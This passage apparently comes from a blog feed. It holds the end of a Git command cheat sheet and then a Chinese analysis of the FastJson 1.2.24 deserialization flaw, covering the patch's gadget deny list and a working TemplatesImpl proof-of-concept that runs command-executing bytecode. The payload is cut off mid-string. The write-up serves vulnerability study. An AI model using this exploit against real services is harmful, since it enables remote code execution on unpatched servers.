<code>.git</code>目录不算工作区，而是Git的版本库。</p><p>Git的版本库里存了很多东西，其中最重要的就是称为 <code>stage</code>（或者叫 <code>index</code>）的暂存区，还有Git为我们自动创建的第一个分支 <code>master</code>，以及指向 <code>master</code>的一个指针叫 <code>HEAD</code>。<br><img src="https://upload-images.jianshu.io/upload_images/9113969-d915e0fe831cdaa1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><img src="https://upload-images.jianshu.io/upload_images/9113969-3a397010c935afd2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h3 id="创建和合并分支"><a href="#创建和合并分支" class="headerlink" title="创建和合并分支"></a>创建和合并分支</h3><p>创建+切换分支 <code>dev</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b dev</span><br></pre></td></tr></table></figure><p>git checkout命令加上-b参数表示创建并切换，相当于以下两条命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git branch dev</span><br><span class="line">$ git checkout dev</span><br></pre></td></tr></table></figure><p>创建分支</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch dev</span><br></pre></td></tr></table></figure><p>切换分支</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout master</span><br></pre></td></tr></table></figure><p>查看当前分支<br>git branch命令会列出所有分支，当前分支前面会标一个*号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* dev</span><br><span class="line">  master</span><br></pre></td></tr></table></figure><p>合并分支<br>合并分支时，加上–no-ff参数就可以用普通模式合并，合并后的历史有分支，能看出来曾经做过合并，而fast forward合并就看不出来曾经做过合并。<br><code>git merge</code>命令用于合并指定分支到当前分支。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git merge dev</span><br><span class="line">git merge --no-ff -m &quot;merge with no-ff&quot; dev</span><br></pre></td></tr></table></figure><p>删除分支</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch -d dev</span><br></pre></td></tr></table></figure><h3 id="保存未提交的修改"><a href="#保存未提交的修改" class="headerlink" title="保存未提交的修改"></a>保存未提交的修改</h3><p><code>git stash</code>会把所有未提交的修改（包括暂存的和非暂存的）都保存起来，用于后续恢复当前工作目录。<br>查看已储存的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git stash list</span><br></pre></td></tr></table></figure><p>恢复已储存的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git stash apply</span><br></pre></td></tr></table></figure><p>恢复已储存的文件并删除stash中的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git stash pop</span><br></pre></td></tr></table></figure><h3 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h3><p>创建标签<br>默认标签是打在最新提交的commit上的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git tag v1.0</span><br></pre></td></tr></table></figure><p>对指定 <code>commit id</code>打标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git tag v0.9 [commit id]</span><br></pre></td></tr></table></figure><p>查看所有标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git tag</span><br></pre></td></tr></table></figure><p>查看标签信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show &lt;tagname&gt;</span><br></pre></td></tr></table></figure><p>删除标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git tag -d v0.1</span><br></pre></td></tr></table></figure><p>推送标签到远程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin &lt;tagname&gt;</span><br></pre></td></tr></table></figure><p>一次性推送全部尚未推送到远程的本地标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin --tags</span><br></pre></td></tr></table></figure><p>删除远程标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">先从本地删除</span><br><span class="line">$ git tag -d v0.9</span><br><span class="line">Deleted tag &#x27;v0.9&#x27; (was f52c633)</span><br><span class="line"></span><br><span class="line">然后从远程删除</span><br><span class="line">$ git push origin :refs/tags/v0.9</span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line"> - [deleted]         v0.9</span><br></pre></td></tr></table></figure><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-ef9b58f6558e4760.png" alt="图片.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FastJson Deserialization Vulnerability</title>
      <link href="/2020/08/03/FastJson-Deserialization-Vulnerability/"/>
      <url>/2020/08/03/FastJson-Deserialization-Vulnerability/</url>
      
        <content type="html"><![CDATA[<h2 id="FastJson反序列化漏洞"><a href="#FastJson反序列化漏洞" class="headerlink" title="FastJson反序列化漏洞"></a>FastJson反序列化漏洞</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>创建Maven项目</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.20</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.10</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p><strong>影响版本</strong></p><p>1.2.24版本以下</p><p>根据官方的公告中的WAF检测方法来看，问题很有可能是因为反序列化了任意类型的class从而导致的RCE。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200730162407906.png" alt="image-20200730162407906"></p><p>关于漏洞的具体详情可参考 <code>https://github.com/alibaba/fastjson/wiki/security_update_20170315</code></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> &#123;</span><br><span class="line">        User user=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;L0ki&quot;</span>);</span><br><span class="line">        String user_json= JSON.toJSONString(user);</span><br><span class="line">        System.out.println(user_json);</span><br><span class="line"></span><br><span class="line">        Object user1=JSON.parse(user_json);</span><br><span class="line">        Object user2=JSON.parseObject(user_json,User.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(user1.getClass().getName());</span><br><span class="line">        System.out.println(user2.getClass().getName());</span><br><span class="line">        System.out.println(((User)user2).getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 <code>parse(String)</code>将JSON字符串解析成了一个JSONObject对象，<code>parseObject(String,Class)</code>将JSON字符串反序列化为一个相应的Java对象</p><p>另外FastJson还提供一个特殊字符段 <code>@type</code>，通过这个字段可以指定反序列化任意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> &#123;</span><br><span class="line">        String user_json=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.User\&quot;,\&quot;name\&quot;:\&quot;L0ki\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(user_json);</span><br><span class="line"></span><br><span class="line">        Object user1=JSON.parse(user_json);</span><br><span class="line">        Object user2=JSON.parseObject(user_json,User.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(user1.getClass().getName());</span><br><span class="line">        System.out.println(user2.getClass().getName());</span><br><span class="line">        System.out.println(((User)user2).getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setter...&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org . example.User&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;L0ki&quot;</span>&#125;</span><br><span class="line">setter. . .</span><br><span class="line">setter. . .</span><br><span class="line">org. example. User</span><br><span class="line">org . example.User</span><br><span class="line">L0ki</span><br><span class="line"><span class="comment">//从回显看反序列化程序执行顺序</span></span><br></pre></td></tr></table></figure><p>根据终端回显,我们可以看出来：在反序列化的同时调用了对象的set方法，说明FastJson在对JSON字符串反序列化的时候，会尝试通过setter方法对对象的属性进行赋值</p><p>那么在这种情况下，找到有可以利用的setter方法的类，就能完成该漏洞的利用</p><p>在满足一定条件下也会调用getter方法</p><blockquote><ul><li>方法名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无传入参数</li><li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String json=<span class="string">&quot;&#123;\&quot;table\&quot;:&#123;&#125;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Foo foo=JSON.parseObject(json,Foo.class, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Hashtable table;</span><br><span class="line">    <span class="keyword">public</span> Hashtable <span class="title function_">getTable</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getter&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;table&quot;</span>:&#123;&#125;&#125;</span><br><span class="line">getter</span><br></pre></td></tr></table></figure><p>具体的规则参考于 <a href="https://xz.aliyun.com/t/7027">JAVA反序列化—FastJson组件</a></p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>通过官网给出的补丁文件，主要的更新在这个checkAutoType函数上，而这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中。具体包括：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework</span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;&#x2F; 新增的黑名单<br>bsh<br>com.mchange<br>com.sun.<br>java.lang.Thread<br>java.net.Socket<br>java.rmi<br>javax.xml<br>org.apache.bcel<br>org.apache.commons.beanutils<br>org.apache.commons.collections.Transformer<br>org.apache.commons.collections.functors<br>org.apache.commons.collections4.comparators<br>org.apache.commons.fileupload<br>org.apache.myfaces.context.servlet<br>org.apache.tomcat<br>org.apache.wicket.util<br>org.codehaus.groovy.runtime<br>org.hibernate<br>org.jboss<br>org.mozilla.javascript<br>org.python.core<br>org.springframewor</p></blockquote><p>同时添加了checkAutoType类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (typeName.length() &gt;= maxTypeNameLength) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>我们可以看到其核心代码就是:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>直接遍历denyList数组，只要引用的库中是以denyList中某个deny打头，即以我们的黑名单中的字符串开头的就直接抛出异常中断运行。</p><h3 id="POC—基于Templatempl"><a href="#POC—基于Templatempl" class="headerlink" title="POC—基于Templatempl"></a>POC—基于Templatempl</h3><p>根据test.java我们可以看到恶意代码的执行位置在构造方法中</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200730155424188.png" alt="image-20200730155424188"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClass</span><span class="params">(String cls)</span>&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title function_">test_autoTypeDeny</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileSeparator</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;file.separator&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>) + <span class="string">&quot;\\target\\classes\\person\\Test.class&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilClassPath);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_name&#x27;:&#x27;a.b&#x27;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line">        <span class="comment">//String personStr = &quot;&#123;&#x27;name&#x27;:&quot;+text1+&quot;,&#x27;age&#x27;:19&#125;&quot;;</span></span><br><span class="line">        <span class="comment">//Person obj = JSON.parseObject(personStr, Person.class, config, Feature.SupportNonPublicField);</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">        <span class="comment">//assertEquals(Model.class, obj.getClass());</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>根据POC的关键代码我们进行分析</p><ul><li>@type指定解析类，fastjson会根据指定类去反序列化得到该类的实例</li><li>_bytecodes，加载的恶意字节码</li><li>_ outputProperties-&gt;getOutputProperties</li><li>_ tfactory,_ name</li><li>Feature.SupportNonPublicField</li></ul><p>我们可以看到Test.java主要实现了一个类，这个类利用 <code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>语句执行弹出计算器的命令，而POC.java文件中主要执行test_autoTypeDeny()函数，函数获取Test.java文件编译完成后的.class文件然后进行base64编码，将编码后的字符串赋值给_bytecodes加上POC.</p><p>通过 <code>Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</code>执行反序列化操作，执行命令。</p><p>在这个poc中，最核心的部分是 <code>_ bytecodes</code>，它是要执行的代码，<code>@type</code>是指定的解析类，<code>fastjson</code>会根据指定类去反序列化得到该类的实例，在默认情况下，fastjson只会反序列化公开的属性和域，而 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>中 <code>_ bytecodes</code>却是私有属性，<code>_ name</code>也是私有域，所以在 <code>parseObject</code>的时候需要设置 <code>Feature.SupportNonPublicField</code>，这样 <code>_ bytecodes</code>字段才会被反序列化。<code>_ tfactory</code>这个字段在 <code>TemplatesImpl</code>既没有get方法也没有set方法，这没关系，我们设置 <code>_ tfactory</code>为{ },fastjson会调用其无参构造函数得 <code>_ tfactory</code>对象，这样就解决了某些版本中在 <code>defineTransletClasses()</code>用到会引用 <code>_tfactory</code>属性导致异常退出。</p><p>所以可以根据这个构造漏洞利用的 <code>payload</code>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text1=<span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span 